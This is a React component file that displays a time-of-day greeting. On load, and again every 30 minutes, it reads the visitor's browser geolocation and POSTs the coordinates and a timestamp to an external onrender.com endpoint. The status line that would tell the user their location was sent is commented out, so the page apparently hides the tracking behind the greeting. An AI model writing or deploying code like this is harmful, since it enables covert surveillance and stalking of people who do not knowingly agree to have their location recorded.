import React, { useEffect, useState } from "react";

function LocationTracker() {
  const [message, setMessage] = useState("Fetching location...");
  const [greeting, setGreeting] = useState("");

  useEffect(() => {
    // 🌟 Greeting logic
    const updateGreeting = () => {
      const hour = new Date().getHours();

      if (hour >= 5 && hour < 12) {
        setGreeting("🌅 Good Morning");
      } else if (hour >= 12 && hour < 17) {
        setGreeting("☀️ Good Afternoon");
      } else if (hour >= 17 && hour < 21) {
        setGreeting("🌇 Good Evening");
      } else {
        setGreeting("🌙 Good Night");
      }
    };

    updateGreeting();

    // 📍 Location function
    const sendLocation = () => {
      if (!navigator.geolocation) {
        setMessage("Geolocation not supported");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            time: new Date().toISOString()
          };

          try {
            const response = await fetch(
              "https://location-tracker-1-44ln.onrender.com/api/location/save-location",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify(locationData)
              }
            );

            const result = await response.json();

            if (result.success) {
              setMessage(
                "📍 Location sent at " + new Date().toLocaleTimeString()
              );
            } else {
              setMessage(result.message);
            }
          } catch (error) {
            setMessage("Server error");
          }
        },
        (error) => {
          setMessage(error.message);
        }
      );
    };

    // first call
    sendLocation();

    // every 30 min
    const interval = setInterval(sendLocation, 1800000);

    // optional: update greeting every minute
    const greetInterval = setInterval(updateGreeting, 60000);

    return () => {
      clearInterval(interval);
      clearInterval(greetInterval);
    };
  }, []);

  return (
    <div style={{ textAlign: "center", marginTop: "100px" }}>
      <h1>{greeting}</h1>
      {/* <h2>{message}</h2> */}
    </div>
  );
}

export default LocationTracker;